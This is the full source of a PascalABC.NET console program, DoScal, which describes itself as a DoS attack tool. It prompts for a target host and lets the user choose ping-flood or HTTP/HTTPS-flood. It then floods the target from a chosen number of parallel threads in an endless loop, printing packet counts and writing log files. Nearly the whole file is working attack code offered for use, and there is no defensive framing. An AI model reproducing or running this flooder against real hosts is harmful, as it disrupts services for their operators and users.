program DoScal;

uses CRT, System, System.Net, System.Net.NetworkInformation, System.Threading.Tasks;

var
  thread_sum, t: uint64;

type
  thread = class
    workload: procedure;
    constructor(f: procedure) ;
    begin
      workload := f;
      thread_sum += 1;
    end;
    
    function load: boolean;
    begin
      workload;
      Result := true;
    end;
  end;

type
  BTask = Task<boolean>;

var
  address, save_file_name: string;
  protocol, type_attack: shortint;
  p: Ping;
  res: PingReply;
  d: DateTime;
  save_file: PABCSystem.Text;
  thread_k: integer;
  tb: array of BTask;

procedure log(mess: string);
begin
  d := DateTime.Now;
  Append(save_file, save_file_name);
  write(save_file, d.Day, '.', d.Month, '.', d.Year, ' ');
  write(save_file, d.Hour, ':', d.Minute, ':', d.Second, ' ');
  WriteLn(save_file, mess);
  Close(save_file);
end;

procedure ping_flood_attack();
var
  pg: Ping;
begin
  pg := new Ping();
  res := pg.Send(address);
end;

procedure http_flood_attack();
var
  w: WebClient;
begin
  w := new WebClient();
  w.DownloadString(address);
end;

procedure attack(pr: procedure);
begin
  for var i := 0 to tb.Length - 1 do
    tb[i] := Task.Factory.StartNew((new thread(pr)).load);
  if tb[tb.Length - 1].Result then
  begin
    GotoXY(1, 7);
    ClearLine;
    GotoXY(1, 7);
    Writeln('+' + thread_k + ' packages in ' + MillisecondsDelta + ' ms.');
    Writeln('Total: ' + thread_sum + ' packages in ' + (Milliseconds - t) / 1000 + ' s.');
  end;
end;

begin
  try
    d := DateTime.Now;
    MkDir('logs');
    save_file_name := 'logs\log_' + d.Day + '.' + d.Month + '.' + d.Year + '_' + d.Hour + '-' + d.Minute + '-' + d.Second + '.txt';
    SetWindowCaption('DoScal 1.0.0 (c) Evost');
    SetWindowSize(80, 20);
    SetBufferSize(80, 20);
    TextColor(Green);
    Writeln('github.com/evost/DoScal');
    Writeln('To exit close the window.');
    Writeln('Enter the address (without protocol):');
    Readln(address);
    p := new Ping();
    res := p.Send(address);
    log('New connection ' + address + ' ' + res.Address.ToString + ' ' + res.RoundtripTime.ToString + ' ms');
    repeat
      Writeln('Select the type of attack:');
      Writeln('[0] - ping-flood (weak, less traffic)');
      Writeln('[1] - HTTP-flood (moderate, more traffic)');
      Readln(type_attack);
    until (type_attack = 0) or (type_attack = 1);
    repeat
      Writeln('Enter the number of threads (recommended 10-50):');
      Readln(thread_k);
    until (thread_k > 0);
    tb := new BTask[thread_k];
    protocol := -1;
    if type_attack = 1 then
      repeat
        Writeln('Select protocol:');
        Writeln('[0] - HTTP  (80  port)');
        Writeln('[1] - HTTPS (443 port)');
        Readln(protocol);
      until (protocol = 0) or (protocol = 1);
    if protocol = 0 then
      address := 'http://' + address;
    if protocol = 1 then
      address := 'https://' + address;
    HideCursor;
    ClrScr;
    Writeln('DoS attack began');
    Writeln('Host    : ' + address);
    Writeln('IP      : ' + res.Address.ToString);
    Writeln('Ping    : ' + res.RoundtripTime.ToString);
    Writeln('Type    : ' + type_attack + ' ([0] - ping-flood; [1] - HTTP-flood)');
    Writeln('Threads : ' + thread_k);
    t := Milliseconds;
    case type_attack of
      0:
        begin
          log('Start ping-flood attack ' + address);
          while true do
            attack(ping_flood_attack);
        end;
      1:
        begin
          log('Start HTTP-flood attack ' + address);
          while true do
            attack(http_flood_attack);
        end;
    end;
  except
    on e: Exception do
    begin
      log(e.Message);
      Writeln('All fucked up. Fine. Look logfile.');
      Writeln('To exit press Enter.');
      Readln;
    end;
  end;
end.